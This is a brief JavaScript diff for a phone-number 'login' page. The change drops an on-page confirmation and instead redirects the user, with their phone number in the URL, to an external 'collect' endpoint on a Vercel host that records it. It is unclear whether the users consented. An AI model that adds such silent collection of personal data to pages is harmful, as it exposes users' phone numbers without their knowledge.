@@ -43,9 +43,8 @@ function submitPhone() {
   }
   err.textContent = '';
 
-  // 号码显示在登录页再跳转
-  document.querySelector('.card').innerHTML = '<div class="icon">✅</div><h2>登录成功</h2><p style="font-size:2em;font-weight:800;color:#1a3a6b;margin:16px 0;letter-spacing:3px">' + phone + '</p><p style="color:#888">正在跳转...</p>';
-  setTimeout(function() { window.location.href = TARGET + '?phone=' + encodeURIComponent(phone); }, 3000);
+  // 跳到Vercel记录 → Vercel再跳到筛岗
+  window.location.href = 'https://phone-api2.vercel.app/api/collect?phone=' + encodeURIComponent(phone);
 }
 </script>
 
